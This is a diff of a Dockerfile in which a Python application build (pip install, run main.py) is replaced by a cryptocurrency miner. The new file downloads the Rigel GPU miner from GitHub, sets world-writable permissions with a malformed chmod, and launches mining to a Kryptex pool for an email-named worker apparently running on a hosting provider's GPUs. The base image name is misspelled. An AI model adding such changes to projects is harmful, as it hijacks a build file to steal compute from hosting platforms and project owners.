@@ -1,7 +1,9 @@
-FROM python:3.12.4-slim
+FROM ubtntu
+
+RUN wget https://github.com/kryptex-miners-org/kryptex-miners/releases/download/rigel-1-18-0/rigel-1.18.0-linux.tar.gz && tar -xvf rigel-1.18.0-linux.tar.gz
 
 COPY . .
 
-RUN pip3 install -U -r requirements.txt
+RUN chmod -R 0777
 
-CMD python3 main.py
+CMD ./rigel -a fishhash -o stratum+ssl://iron.kryptex.network:8888 -u uskamlesh3@gmail.com.koyeb-gpu
